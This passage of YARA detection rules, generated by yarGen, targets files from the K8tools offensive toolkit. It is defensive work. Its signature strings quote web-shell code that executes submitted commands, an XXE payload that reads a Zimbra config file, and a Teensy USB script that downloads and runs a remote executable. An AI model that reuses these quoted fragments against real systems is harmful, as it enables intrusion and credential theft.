      $s20 = "payload1='\\x5F\\x5F\\x62\\x70\\x38\\x32\\x63\\x31\\x33\\x35\\x30\\x30\\x39\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x6323 and filesize < 80KB and
      8 of them
}

rule K8_rarBind {
   meta:
      description = "K8tools - file K8_rarBind.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "2ed64cd92be31c353fa525483950c85d69b4aff8d9a110c3e201eca9cec1797c"
   strings:
      $s1 = "K8_rarBind\\WinRAR.exe" fullword ascii /* score: '18.42'*/
      $s2 = "K8_rarBind\\K8_RarBind.exe" fullword ascii /* score: '18.42'*/
      $s3 = "K8_rarBind\\Default.SFX" fullword ascii /* score: '10.00'*/
      $s4 = "* ,|X;r" fullword ascii /* score: '9.00'*/
      $s5 = "K8_rarBind\\" fullword ascii /* score: '7.00'*/
      $s6 = "K8_rarBind" fullword ascii /* score: '7.00'*/
      $s7 = "U#(M- " fullword ascii /* score: '5.42'*/
      $s8 = "!CCd- " fullword ascii /* score: '5.42'*/
      $s9 = "<y)A -" fullword ascii /* score: '5.00'*/
      $s10 = "`m<~w?mv -" fullword ascii /* score: '5.00'*/
      $s11 = "DjWqbG7" fullword ascii /* score: '5.00'*/
      $s12 = "u* co,=" fullword ascii /* score: '5.00'*/
      $s13 = "GNHFMJZ3" fullword ascii /* score: '5.00'*/
      $s14 = "6Q+ 31" fullword ascii /* score: '5.00'*/
      $s15 = "H)Ei -sRF" fullword ascii /* score: '5.00'*/
      $s16 = "gqwauv" fullword ascii /* score: '5.00'*/
      $s17 = "NMZCQd2" fullword ascii /* score: '5.00'*/
      $s18 = "sSewq[ " fullword ascii /* score: '4.42'*/
      $s19 = "btUC@7 " fullword ascii /* score: '4.42'*/
      $s20 = "DCni=f}" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule K8tools_web {
   meta:
      description = "K8tools - file web.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "b880f93f9b32eddf7fd04fe6aa46c58e7c5ac03a2143bf86b30106dac2ed8e36"
   strings:
      $s1 = "print(\"use: web.exe port\")" fullword ascii /* score: '14.00'*/
      $s2 = "httpd = SocketServer.TCPServer((\"\", PORT), Handler)" fullword ascii /* score: '10.01'*/
      $s3 = "print \"SimpleHTTPServer is \", PORT" fullword ascii /* score: '10.00'*/
      $s4 = "PORT = int(sys.argv[1])" fullword ascii /* score: '7.17'*/
      $s5 = "Handler = SimpleHTTPServer.SimpleHTTPRequestHandler" fullword ascii /* score: '7.17'*/
      $s6 = "PORT = 80" fullword ascii /* score: '7.00'*/
      $s7 = "print \"by k8gege\"" fullword ascii /* score: '4.00'*/
      $s8 = "if len(sys.argv) != 2:" fullword ascii /* score: '4.00'*/
      $s9 = "import SimpleHTTPServer" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s10 = "httpd.serve_forever()" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s11 = "import SocketServer" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s12 = "else: " fullword ascii /* score: '1.42'*/
   condition:
      uint16(0) == 0x6d69 and filesize < 1KB and
      8 of them
}

rule getBrowserPWD_1124_K_8_ {
   meta:
      description = "K8tools - file getBrowserPWD_1124[K.8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "fed2b6867a415be6fbec7ace3e4b201d3f0de557a5a84851e4c824a3a6a512cf"
   strings:
      $s1 = "Bin\\getBrowserPWD.exe" fullword ascii /* score: '23.42'*/
      $s2 = "Bin\\get.PNG" fullword ascii /* score: '12.00'*/
      $s3 = "t.Gwp " fullword ascii /* score: '4.42'*/
      $s4 = "$ujcD>=t=(I" fullword ascii /* score: '4.00'*/
      $s5 = "TRhUCcQzJ{" fullword ascii /* score: '4.00'*/
      $s6 = "psaJ5\\" fullword ascii /* score: '4.00'*/
      $s7 = ":GqNq*7%Y$" fullword ascii /* score: '4.00'*/
      $s8 = "BZWo4!;" fullword ascii /* score: '4.00'*/
      $s9 = "LYYEVZw" fullword ascii /* score: '4.00'*/
      $s10 = "UQdQ7[i}&" fullword ascii /* score: '4.00'*/
      $s11 = "saLQQE&B" fullword ascii /* score: '4.00'*/
      $s12 = "KnUM9]`" fullword ascii /* score: '4.00'*/
      $s13 = "cPBViRj" fullword ascii /* score: '4.00'*/
      $s14 = "MtiA~>r" fullword ascii /* score: '4.00'*/
      $s15 = "[bNhg2-s" fullword ascii /* score: '4.00'*/
      $s16 = "5cxxJ-Q24V" fullword ascii /* score: '4.00'*/
      $s17 = ".GEK>r~" fullword ascii /* score: '4.00'*/
      $s18 = "OoHMQI$" fullword ascii /* score: '4.00'*/
      $s19 = "s(!xmez65zB%" fullword ascii /* score: '4.00'*/
      $s20 = "LLXxnG&" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 1000KB and
      8 of them
}

rule QQ_______ClientKey_____________ {
   meta:
      description = "K8tools - file QQ远控 ClientKey 利用工具.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "b6693b0ea14413120e8525f46f467260c4892f963a472366db0036b6958b37e7"
   strings:
      $s1 = "\\xitpz.ini" fullword ascii /* score: '8.00'*/
      $s2 = "ClientKey " fullword ascii /* score: '7.42'*/
      $s3 = "z  y+ " fullword ascii /* score: '5.00'*/
      $s4 = "YVUAiB3" fullword ascii /* score: '5.00'*/
      $s5 = "\\tishiyin" fullword ascii /* score: '5.00'*/
      $s6 = "\\tishiyin\\" fullword ascii /* score: '5.00'*/
      $s7 = "[HP%z%4" fullword ascii /* score: '5.00'*/
      $s8 = ">MFv!." fullword ascii /* score: '5.00'*/
      $s9 = "!U -:o" fullword ascii /* score: '5.00'*/
      $s10 = "VAKZ^Bm(\"$" fullword ascii /* score: '4.42'*/
      $s11 = "OdBsq%y" fullword ascii /* score: '4.00'*/
      $s12 = "sawu]#>" fullword ascii /* score: '4.00'*/
      $s13 = "qFVI7}y" fullword ascii /* score: '4.00'*/
      $s14 = "PcuF/tU" fullword ascii /* score: '4.00'*/
      $s15 = "uYdTp\\" fullword ascii /* score: '4.00'*/
      $s16 = "oNaQ%~P" fullword ascii /* score: '4.00'*/
      $s17 = "jFCnEbD" fullword ascii /* score: '4.00'*/
      $s18 = "{uweIBvl" fullword ascii /* score: '4.00'*/
      $s19 = "75B3ymWHZn0" fullword ascii /* score: '4.00'*/
      $s20 = "DTxMp\"" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule Comahawk {
   meta:
      description = "K8tools - file Comahawk.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "2b33269da5a352792737646d1b9c72d0bf82eb7f5c8ebe9748de236101291a65"
   strings:
      $s1 = "COMahawk64.exe`]" fullword ascii /* score: '17.00'*/
      $s2 = "COMahawk.exe`]" fullword ascii /* score: '17.00'*/
      $s3 = "vul.txt`]" fullword ascii /* score: '11.00'*/
      $s4 = "CVE-2019-1405 & CVE-2019-1322.PNG`]" fullword ascii /* score: '8.00'*/
      $s5 = "%g%\\XD?`" fullword ascii /* score: '5.00'*/
      $s6 = "PKxeQq7" fullword ascii /* score: '5.00'*/
      $s7 = "DlEmMo 02" fullword ascii /* score: '4.00'*/
      $s8 = "ddEaxXp" fullword ascii /* score: '4.00'*/
      $s9 = "9gyFS;XR" fullword ascii /* score: '4.00'*/
      $s10 = "*LKVtO!R" fullword ascii /* score: '4.00'*/
      $s11 = "ctVy77*B" fullword ascii /* score: '4.00'*/
      $s12 = "`smaa|Jn" fullword ascii /* score: '4.00'*/
      $s13 = "dSna8L7" fullword ascii /* score: '4.00'*/
      $s14 = "WHSz-\"" fullword ascii /* score: '4.00'*/
      $s15 = "cCkh&48" fullword ascii /* score: '4.00'*/
      $s16 = "(bnZr2s!" fullword ascii /* score: '4.00'*/
      $s17 = "uLwPkS#" fullword ascii /* score: '4.00'*/
      $s18 = "\\*}4_Z" fullword ascii /* score: '2.00'*/
      $s19 = "ZMwyX2" fullword ascii /* score: '2.00'*/
      $s20 = "D^P]H?[\\x6VH" fullword ascii /* score: '1.42'*/
   condition:
      uint16(0) == 0x6152 and filesize < 400KB and
      8 of them
}

rule K8weblogic {
   meta:
      description = "K8tools - file K8weblogic.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "520c7663266cf2016f83bd14d096cf4d3ee2c1ef0a6a1c136f2ae3c7281e920e"
   strings:
      $s1 = "gui_i____.exe" fullword ascii /* score: '16.00'*/
      $s2 = "demo/WebLogicPasswordDecryptor.class" fullword ascii /* score: '15.00'*/
      $s3 = "demo/WebLogicPasswordDecryptor.classPK" fullword ascii /* score: '15.00'*/
      $s4 = "#Java Runtime Environment not found.#Java Runtime Environment not valid.'Java Virtual Machine initialize failed.#Java Virtual Ma" wide /* score: '14.00'*/
      $s5 = "org/eclipse/jdt/internal/jarinjarloader/PK" fullword ascii /* score: '13.00'*/
      $s6 = "org/eclipse/jdt/internal/jarinjarloader/RsrcURLConnection.classPK" fullword ascii /* score: '12.00'*/
      $s7 = "org/eclipse/jdt/internal/jarinjarloader/RsrcURLConnection.class" fullword ascii /* score: '12.00'*/
      $s8 = "_Java_com_regexlab_j2e_SystemTrayMenu_finalize@8" fullword ascii /* score: '10.00'*/
      $s9 = "_Java_com_regexlab_j2e_SystemTray_init@28" fullword ascii /* score: '10.00'*/
      $s10 = "_Java_com_regexlab_j2e_SystemTray_Change@28" fullword ascii /* score: '10.00'*/
      $s11 = "_Java_com_regexlab_j2e_SystemTrayMenu_AppendSeparator@8" fullword ascii /* score: '10.00'*/
      $s12 = "_Java_com_regexlab_j2e_SystemTray_finalize@8" fullword ascii /* score: '10.00'*/
      $s13 = "_Java_com_regexlab_j2e_SystemTrayMenu_init@8" fullword ascii /* score: '10.00'*/
      $s14 = "_Java_com_regexlab_j2e_SystemTray_Show@8" fullword ascii /* score: '10.00'*/
      $s15 = "_Java_com_regexlab_j2e_SystemTray_Hide@8" fullword ascii /* score: '10.00'*/
      $s16 = "_Java_com_regexlab_j2e_SystemTrayMenu_Popup@8" fullword ascii /* score: '10.00'*/
      $s17 = "DEMO File Description" fullword wide /* score: '10.00'*/
      $s18 = "_Java_com_regexlab_j2e_SystemTrayMenu_Append__Ljava_lang_String_2Lcom_regexlab_j2e_SystemTrayMenu_2@16" fullword ascii /* score: '10.00'*/
      $s19 = "_Java_com_regexlab_j2e_SystemTrayMenu_Append__Ljava_lang_String_2I@16" fullword ascii /* score: '10.00'*/
      $s20 = "AbsoluteLayout.jar" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      ( pe.imphash() == "ce878847f35f6607b0dec6150c64f165" and ( pe.exports("_Java_com_regexlab_j2e_SystemTrayMenu_AppendSeparator@8") and pe.exports("_Java_com_regexlab_j2e_SystemTrayMenu_Append__Ljava_lang_String_2I@16") and pe.exports("_Java_com_regexlab_j2e_SystemTrayMenu_Append__Ljava_lang_String_2Lcom_regexlab_j2e_SystemTrayMenu_2@16") and pe.exports("_Java_com_regexlab_j2e_SystemTrayMenu_Popup@8") and pe.exports("_Java_com_regexlab_j2e_SystemTrayMenu_finalize@8") and pe.exports("_Java_com_regexlab_j2e_SystemTrayMenu_init@8") ) or 8 of them )
}

rule zimbrapwd {
   meta:
      description = "K8tools - file zimbrapwd.dtd"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1b42c4d097b5f421e533f90e0cf55c843fa683fbd1313c70e4b05dd7546c2f77"
   strings:
      $s1 = "<!ENTITY % all \"<!ENTITY fileContents '%start;%file;%end;'>\">" fullword ascii /* score: '9.00'*/
      $s2 = "<!ENTITY % file SYSTEM \"file:../conf/localconfig.xml\">" fullword ascii /* score: '7.00'*/
      $s3 = "<!ENTITY % start \"<![CDATA[\">" fullword ascii /* score: '4.00'*/
      $s4 = "<!ENTITY % end \"]]>\">" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 1KB and
      all of them
}

rule K8tools_k8cmd_3 {
   meta:
      description = "K8tools - file k8cmd.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "41cce39b553efc5d776c9526bc07ecb81fb8a6ccaed3a6d7f2d2a764ce62f264"
   strings:
      $s1 = "print '->|' + os.popen(base64.b64decode(cmdLine)).read() + '|<-'" fullword ascii /* score: '21.00'*/
      $s2 = "#!C:/Python27/python.exe" fullword ascii /* score: '19.00'*/
      $s3 = "if cmdLine=='Szh0ZWFt':" fullword ascii /* score: '12.00'*/
      $s4 = "cmdLine = form[pwd].value" fullword ascii /* score: '12.00'*/
      $s5 = "# enable debugging" fullword ascii /* score: '8.00'*/
      $s6 = "print '[S]' + os.path.abspath('.') + '[E]'" fullword ascii /* score: '8.00'*/
      $s7 = "if form.has_key(pwd) and form[pwd].value != \"\":" fullword ascii /* score: '7.00'*/
      $s8 = "form = cgi.FieldStorage()" fullword ascii /* score: '4.17'*/
      $s9 = "import cgi" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s10 = "pwd='tom';" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule K8tools_k8cmd_4 {
   meta:
      description = "K8tools - file k8cmd.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "91bbcd02bafd8840348e010d4daf15b566dbedac44c3e5cd9e0b11709c614241"
   strings:
      $s1 = "psi.FileName = \"cmd.exe\";" fullword ascii /* score: '28.00'*/
      $s2 = "psi.UseShellExecute = false;" fullword ascii /* score: '21.17'*/
      $s3 = "<asp:Button ID=\"Button1\" runat=\"server\" onclick=\"cmdExe_Click\" Text=\"Execute\" /><br /><br />" fullword ascii /* score: '21.00'*/
      $s4 = "<HTML><body ><form id=\"cmd\" method=\"post\" runat=\"server\">" fullword ascii /* score: '17.00'*/
      $s5 = "ProcessStartInfo psi = new ProcessStartInfo();" fullword ascii /* score: '15.00'*/
      $s6 = "Process p = Process.Start(psi);" fullword ascii /* score: '15.00'*/
      $s7 = "void cmdExe_Click(object sender, System.EventArgs e)" fullword ascii /* score: '10.00'*/
      $s8 = "<asp:Label ID=\"Label2\" runat=\"server\" Text=\"Commond: \"></asp:Label>" fullword ascii /* score: '10.00'*/
      $s9 = "<script Language=\"c#\" runat=\"server\">" fullword ascii /* score: '10.00'*/
      $s10 = "<asp:TextBox ID=\"cmdResult\" runat=\"server\" Height=\"662px\" Width=\"798px\" TextMode=\"MultiLine\"></asp:TextBox>" fullword ascii /* score: '10.00'*/
      $s11 = "<asp:TextBox ID=\"txt_cmd\" runat=\"server\" Width=\"581px\"></asp:TextBox>&nbsp;" fullword ascii /* score: '10.00'*/
      $s12 = "cmdResult.Text = cmdResult.Text + Server.HtmlEncode(ExcuteCmd(txt_cmd.Text));    " fullword ascii /* score: '9.00'*/
      $s13 = "psi.RedirectStandardOutput = true;" fullword ascii /* score: '7.17'*/
      $s14 = "string ExcuteCmd(string arg)" fullword ascii /* score: '7.00'*/
      $s15 = "StreamReader stmrdr = p.StandardOutput;" fullword ascii /* score: '7.00'*/
      $s16 = "string s = stmrdr.ReadToEnd();" fullword ascii /* score: '7.00'*/
      $s17 = "psi.Arguments = \"/c \"+arg;" fullword ascii /* score: '7.00'*/
      $s18 = "<asp:TextBox ID=\"txt_WebPath\" runat=\"server\" Width=\"579px\"></asp:TextBox>" fullword ascii /* score: '7.00'*/
      $s19 = "stmrdr.Close();" fullword ascii /* score: '7.00'*/
      $s20 = "&nbsp; <br />" fullword ascii /* score: '4.42'*/
   condition:
      uint16(0) == 0x253c and filesize < 3KB and
      8 of them
}

rule K8________________________ {
   meta:
      description = "K8tools - file K8个性桌面右键菜单.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "0a00a2a7057c1ef02c4f2ab6144a9ad2a3699e2d850ad0fafde8f61c34228ec6"
   strings:
      $x1 = "msvbvm60.dll" fullword ascii /* reversed goodware string 'lld.06mvbvsm' */ /* score: '33.00'*/
      $s2 = "pGet/?" fullword ascii /* score: '6.00'*/
      $s3 = "9 /cf1" fullword ascii /* score: '5.00'*/
      $s4 = "yzfktbJ4" fullword ascii /* score: '5.00'*/
      $s5 = "lmnopq" fullword ascii /* score: '5.00'*/
      $s6 = "MaUl089" fullword ascii /* score: '5.00'*/
      $s7 = "J{%Fz%N" fullword ascii /* score: '5.00'*/
      $s8 = "\\oNwA*d=" fullword ascii /* score: '5.00'*/
      $s9 = "netapi" fullword ascii /* score: '5.00'*/
      $s10 = "bcdfgh" fullword ascii /* score: '5.00'*/
      $s11 = "BCDEFW " fullword ascii /* score: '4.42'*/
      $s12 = "JSgELY;K^2Db'9Q\"4K" fullword ascii /* score: '4.42'*/
      $s13 = ">['PdBG]9,K" fullword ascii /* score: '4.00'*/
      $s14 = "e.lZD Q" fullword ascii /* score: '4.00'*/
      $s15 = "#HzaVk\"/" fullword ascii /* score: '4.00'*/
      $s16 = "RoHs.6}GL" fullword ascii /* score: '4.00'*/
      $s17 = "inEb-{," fullword ascii /* score: '4.00'*/
      $s18 = "osFnhDY" fullword ascii /* score: '4.00'*/
      $s19 = "WlCf~'9R" fullword ascii /* score: '4.00'*/
      $s20 = "QWRVvDs" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      ( pe.imphash() == "cc880652726afd2f3a057fff96e83c4e" or ( 1 of ($x*) or 4 of them ) )
}

rule K8tools__github_FUNDING {
   meta:
      description = "K8tools - file FUNDING.yml"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "a04a6401e2ef33906888afa1d0d5ae757ba9aedf87910e14359d91abe78b61e6"
   strings:
      $s1 = "# These are supported funding model platforms" fullword ascii /* score: '11.00'*/
      $s2 = "community_bridge: # Replace with a single Community Bridge project-name e.g., cloud-foundry" fullword ascii /* score: '9.00'*/
      $s3 = "open_collective: # Replace with a single Open Collective username" fullword ascii /* score: '9.00'*/
      $s4 = "patreon: # Replace with a single Patreon username" fullword ascii /* score: '7.00'*/
      $s5 = "ko_fi: # Replace with a single Ko-fi username" fullword ascii /* score: '7.00'*/
      $s6 = "github: # Replace with up to 4 GitHub Sponsors-enabled usernames e.g., [user1, user2]" fullword ascii /* score: '7.00'*/
      $s7 = "tidelift: # Replace with a single Tidelift platform-name/package-name e.g., npm/babel" fullword ascii /* score: '4.00'*/
      $s8 = "custom: # Replace with a single custom sponsorship URL" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 1KB and
      all of them
}

rule K8_C_______________6_0_0510_K_8_ {
   meta:
      description = "K8tools - file K8_C段旁注工具6.0_0510[K.8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "223b0981413f106babb73d5c17b82d049ea68eb5311463b27b8026a062c1662c"
   strings:
      $x1 = "6.0\\payloads\\SmbScan\\x86\\ucl.dll" fullword ascii /* score: '30.00'*/
      $x2 = "6.0\\payloads\\SmbScan\\x86\\libxml2.dll" fullword ascii /* score: '30.00'*/
      $x3 = "6.0\\payloads\\SmbScan\\x86\\tucl-1.dll" fullword ascii /* score: '30.00'*/
      $x4 = "6.0\\payloads\\SmbScan\\x86\\trch-1.dll" fullword ascii /* score: '30.00'*/
      $x5 = "6.0\\payloads\\SmbScan\\x86\\exma-1.dll" fullword ascii /* score: '30.00'*/
      $x6 = "6.0\\payloads\\SmbScan\\x86\\posh-0.dll" fullword ascii /* score: '30.00'*/
      $x7 = "6.0\\payloads\\SmbScan\\x86\\coli-0.dll" fullword ascii /* score: '30.00'*/
      $x8 = "6.0\\payloads\\SmbScan\\x86\\trfo-2.dll" fullword ascii /* score: '30.00'*/
      $x9 = "6.0\\payloads\\SmbScan\\x86\\tibe-2.dll" fullword ascii /* score: '30.00'*/
      $s10 = "6.0\\payloads\\ScanPort\\K8ScanPort.bat" fullword ascii /* score: '24.00'*/
      $s11 = "6.0\\payloads\\ScanPort\\K8ScanPort.dat" fullword ascii /* score: '24.00'*/
      $s12 = "6.0\\payloads\\ScanPort\\K8ScanAllPort.bat" fullword ascii /* score: '24.00'*/
      $s13 = "6.0\\payloads\\ScanPort\\K8ScanBanner.bat" fullword ascii /* score: '24.00'*/
      $s14 = "6.0\\payloads\\ScanPort\\K8ip.txt" fullword ascii /* score: '24.00'*/
      $s15 = "6.0\\payloads\\SmbScan\\Smbtouch.dat" fullword ascii /* score: '21.00'*/
      $s16 = "6.0\\payloads\\ScanAdmin\\k8.txt" fullword ascii /* score: '21.00'*/
      $s17 = "6.0\\payloads\\ScanPort\\ScanPort.ini" fullword ascii /* score: '20.00'*/
      $s18 = "6.0\\payloads\\ScanPort" fullword ascii /* score: '17.00'*/
      $s19 = "6.0\\payloads\\SmbScan\\Smbtouch.xml" fullword ascii /* score: '17.00'*/
      $s20 = "6.0\\K8payloads.ini" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 7000KB and
      1 of ($x*) and all of them
}

rule Ladon6_4 {
   meta:
      description = "K8tools - file Ladon6.4.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "b9bd01c0cc7eec90480e1673c61da9d40aabf0455396559d853e6a7b2504dc06"
   strings:
      $s1 = "Ladon.exe0" fullword ascii /* score: '11.00'*/
      $s2 = "Ladon40.exe0" fullword ascii /* score: '11.00'*/
      $s3 = "smbhash.ini0" fullword ascii /* score: '10.00'*/
      $s4 = "ipcscan.ini0" fullword ascii /* score: '8.00'*/
      $s5 = "smbscan.ini0" fullword ascii /* score: '8.00'*/
      $s6 = "Ladon.cna0" fullword ascii /* score: '7.00'*/
      $s7 = "CMTPwd: k8gege.org" fullword ascii /* score: '7.00'*/
      $s8 = "F'RRAT" fullword ascii /* score: '6.00'*/
      $s9 = "(gEt.?b" fullword ascii /* score: '6.00'*/
      $s10 = "J~(x+ " fullword ascii /* score: '5.42'*/
      $s11 = "tz=.-  " fullword ascii /* score: '5.17'*/
      $s12 = "- TNo{" fullword ascii /* score: '5.00'*/
      $s13 = "# a-(r<]9R" fullword ascii /* score: '5.00'*/
      $s14 = "f32:+ N" fullword ascii /* score: '5.00'*/
      $s15 = "\\DWOT'Mm" fullword ascii /* score: '5.00'*/
      $s16 = "wsyrou" fullword ascii /* score: '5.00'*/
      $s17 = "RR)=ha!." fullword ascii /* score: '5.00'*/
      $s18 = "5%N%X3m" fullword ascii /* score: '5.00'*/
      $s19 = "INI_ipcscan.PNG0" fullword ascii /* score: '5.00'*/
      $s20 = "\"GF'I!." fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 5000KB and
      8 of them
}

rule K8_____________________________20190301_K8_ {
   meta:
      description = "K8tools - file K8屏幕录像 高压缩率版_20190301[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "894f2b66e49748d3566ef36873c2360b8481193aefd20c43bf74fe1666fca2e2"
   strings:
      $s1 = "* )3XrQ" fullword ascii /* score: '9.00'*/
      $s2 = "}u:\\-R" fullword ascii /* score: '7.00'*/
      $s3 = "#-'s+ iF" fullword ascii /* score: '5.00'*/
      $s4 = "fGEGY37" fullword ascii /* score: '5.00'*/
      $s5 = "dyicdu8" fullword ascii /* score: '5.00'*/
      $s6 = "^f>* ~5D" fullword ascii /* score: '5.00'*/
      $s7 = "yjnlsq" fullword ascii /* score: '5.00'*/
      $s8 = "UuTbX v" fullword ascii /* score: '4.00'*/
      $s9 = "XfgLj4 H" fullword ascii /* score: '4.00'*/
      $s10 = "8eqZkP?Ep" fullword ascii /* score: '4.00'*/
      $s11 = "nuFi0^#" fullword ascii /* score: '4.00'*/
      $s12 = "WcymJQJ" fullword ascii /* score: '4.00'*/
      $s13 = "octb?m" fullword ascii /* score: '4.00'*/
      $s14 = "1lBMPn*Q" fullword ascii /* score: '4.00'*/
      $s15 = "JtWj'?i>G" fullword ascii /* score: '4.00'*/
      $s16 = "AfSbJ!" fullword ascii /* score: '4.00'*/
      $s17 = "pkcK!_" fullword ascii /* score: '4.00'*/
      $s18 = "ZTpf}dG" fullword ascii /* score: '4.00'*/
      $s19 = "ibOe\"]o!" fullword ascii /* score: '4.00'*/
      $s20 = "nxRIr!v" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule K8tools__git_index {
   meta:
      description = "K8tools - file index"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "c807ca03d90a379c4fb86feccf2a544d2a195c8d0e8189e67de798f965d37aeb"
   strings:
      $x1 = "K8shellcodeLoader.exe" fullword ascii /* score: '36.00'*/
      $x2 = "sshcmd.exe" fullword ascii /* score: '34.00'*/
      $x3 = "k8cmd.exe" fullword ascii /* score: '31.00'*/
      $s4 = "sshshell.exe" fullword ascii /* score: '27.00'*/
      $s5 = "getvpnpwd.exe" fullword ascii /* score: '27.00'*/
      $s6 = "K8weblogic.exe" fullword ascii /* score: '27.00'*/
      $s7 = "AK8_SC_ENCODE(CobaltStrike & Metasploit Shellcode" fullword ascii /* score: '26.00'*/
      $s8 = "VNCdoor.exe" fullword ascii /* score: '26.00'*/
      $s9 = "K8PortScan.exe" fullword ascii /* score: '26.00'*/
      $s10 = "+CVE-2018-2628 Weblogic GetShell Exploit.rar" fullword ascii /* score: '26.00'*/
      $s11 = "K8PortMap.exe" fullword ascii /* score: '25.00'*/
      $s12 = "ScRunBase64.exe" fullword ascii /* score: '25.00'*/
      $s13 = "ScRunBase32.exe" fullword ascii /* score: '25.00'*/
      $s14 = "scrun.exe" fullword ascii /* score: '25.00'*/
      $s15 = "\"CVE-2018-2628 Weblogic GetShell.py" fullword ascii /* score: '23.00'*/
      $s16 = "wmiexec.vbs" fullword ascii /* score: '22.00'*/
      $s17 = "iislpe.exe" fullword ascii /* score: '22.00'*/
      $s18 = "TeamServer.exe" fullword ascii /* score: '22.00'*/
      $s19 = "K8domainVBS.exe" fullword ascii /* score: '22.00'*/
      $s20 = "laZagne.exe" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x4944 and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule K8tools_sshcmd_2 {
   meta:
      description = "K8tools - file sshcmd.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "d91f0b07f07b637fb40998a746bea8a0d2eb57da1b2e65e9682e0b2f453b29f6"
   strings:
      $s1 = "stdin, stdout, stderr = ssh.exec_command(sys.argv[5])" fullword ascii /* score: '24.00'*/
      $s2 = "ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())" fullword ascii /* score: '15.00'*/
      $s3 = "import paramiko" fullword ascii /* score: '9.00'*/
      $s4 = "print stdout.read()" fullword ascii /* score: '7.00'*/
      $s5 = "print(\"sshcmd 1.0\")" fullword ascii /* score: '7.00'*/
      $s6 = "ssh.close()" fullword ascii /* score: '7.00'*/
      $s7 = "ssh.connect(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])" fullword ascii /* score: '7.00'*/
      $s8 = "ssh = paramiko.SSHClient()" fullword ascii /* score: '4.17'*/
      $s9 = "print(\"by k8gege\")" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6d69 and filesize < 1KB and
      all of them
}

rule K8_Teensy_USB_________________________Windows___Linux_______________ {
   meta:
      description = "K8tools - file K8 Teensy USB渗透 同时兼容所有Windows和Linux系统下载者.ino"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "147c48bea8f971a222284ce5fa1704af46aaea38720b6c8dc951c45feeb42cc7"
   strings:
      $x1 = "Keyboard.println(\"wget http://192.168.1.8/x.out -O xxoo.out\");" fullword ascii /* score: '30.00'*/
      $x2 = "omg(\"cmd /c cscript K8.vbs\");" fullword ascii /* score: '30.00'*/
      $s3 = "omg(\"cmd.exe\");" fullword ascii /* score: '22.17'*/
      $s4 = "omg(\"cmd /c del K8.vbs\");" fullword ascii /* score: '21.00'*/
      $s5 = "omg(\"cmd /c x.exe\");" fullword ascii /* score: '21.00'*/
      $s6 = "ascii_println(\"echo strFileURL = \\\"http://192.168.1.8/x.exe\\\" > K8.vbs\");" fullword ascii /* score: '19.00'*/
      $s7 = "ascii_println(\"echo objXMLHTTP.open \\\"GET\\\", strFileURL, false >> K8.vbs\");" fullword ascii /* score: '19.00'*/
      $s8 = "//lnx & win httpDownExec by K8team 2015.4.6" fullword ascii /* score: '19.00'*/
      $s9 = "ascii_println(\"echo Set objFSO = Createobject(\\\"Scripting.FileSystemObject\\\") >> K8.vbs\");" fullword ascii /* score: '17.01'*/
